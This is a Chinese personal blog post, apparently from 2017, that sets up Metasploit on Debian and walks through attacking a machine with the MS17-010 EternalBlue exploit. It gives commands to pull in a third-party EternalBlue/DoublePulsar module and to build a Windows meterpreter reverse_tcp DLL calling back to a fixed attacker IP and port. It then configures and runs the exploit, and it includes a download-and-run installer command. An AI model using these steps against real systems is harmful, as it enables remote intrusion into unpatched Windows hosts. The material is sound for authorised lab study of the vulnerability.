---
title: MetasploitFramework搭建与说明
date: 2017-06-16 20:55:35
categories: Metasploit
---
*这里简单记录一下Metasploit的环境搭建以及一些简单的测试*
***
# 系统选择
我个人对于linux内核底层的一些东西是不是很熟悉的,所以对于现在主流的linux发行版,我个人觉得Ubuntu就是面对家庭使用的,Cent OS是服务器大量使用的一种版本,所以,我最终选择了Debian,注意..我不是挑事,也不是信仰问题,只是单纯的比较喜欢这个系统.而且Kali刚好也是基于Debian的发行版本开发的,所以刚好拿来用,如果用Kali的话,那下面这部分就完全不需要看了.
# Metasploit框架安装
1. 安装curl
`apt-get install curl`
2. 执行
```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
```
3. 这样就完成了Metasploit框架的安装,如果还不懂的同学,看这里
---><a target="_blank" href="https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers"><font color="blue">戳我</cont></div></a>
    这里有安装说明,但是是英文的,看不懂的同学请自行翻译.
# Metasploit简单测试
前段时间NSA爆出的EternalBlue,这个17-010漏洞就有点666了,就用它做个小测试.有大神已经把他移植到Metasploit里了,赶紧fork一下借来玩玩哈哈哈~
1. 下载:<a target="_blank" href="https://github.com/CCCY0/Eternalblue-Doublepulsar-Metasploit"><div style="color:blue">github</div></a>
放到msf的usr/share/metasploit-framework/modules/exploits/windows/smb/目录里,改变.rb文件的目录和生成dll文件的名字
![](/images/Metasploit/1.png)
2. 开启msf数据库
启动数据库：`service postgresql start`
启动msfsploit服务：`service metasploit start`
启动msfconsole：`msfconsole`
使用`db_status`确认数据库是否正确连接
如果数据库未连接,使用`db_connect postgres:123456@127.0.0.1:5433/msf`连接数据库
![](/images/Metasploit/2.png)
>如果没有数据库账户,也没有数据库那么:
*这些配置从网上找的,我没有验证过.*
>启动postgresql `sudo  systemctl start postgresql`
>切换到postgresql `su postgres`
>创建一个postgresql数据库账户 `create user root –P`
>接着，会提示输入密码，然后确认密码
>创建数据库 `createdb --owner=root nexp_db`
>owner参数指定数据库的所有者，后一个参数为数据库名称
>然后退出进入MSF连接数据库 `db_connect root:toor@localhost/nexp_db`
3. 利用ms17-010漏洞扫描工具扫描
![](/images/Metasploit/3.png)
扫描过程省略...
4. 打开多架构兼容模式,安装32位运行库,安装32位wine
` sudo dpkg --add-architecture i386`
`apt-get update`
`apt-get install   lib32z1 lib32ncurses5`
`apt-get install wine`
或者重新安装wine
`rm –rf /root/.wine/` ---删除wine
`wine cmd.exe` --安装wine
这里可能出错,具体以后再说.
5. 生成64位的dll
`msfvemon -p windows/x64/meterpreter/reverse_tcp lhost=192.168.12.110 lport=4444 -f dll -o /root/dll/s11.dll`
这里注意,如果你自己指定目录,需要把.rb文件里面下面那一行.dll文件的目录也修改了.lhost是本地ip.
6. 启动msf调用这个模块并进行配置
![](/images/Metasploit/4.png)
set rhost ---目标ip
set lhost ---本地ip
set target ---架构,根据rb文件来看,用9就可以
set targetarchitecture ---目标架构
set payload windows/... ---payload程序架构
设置好了之后,RUN!
7. 关于meterpreter:这个东西还是挺不错的,关于后渗透的东西,以后再说吧- -.

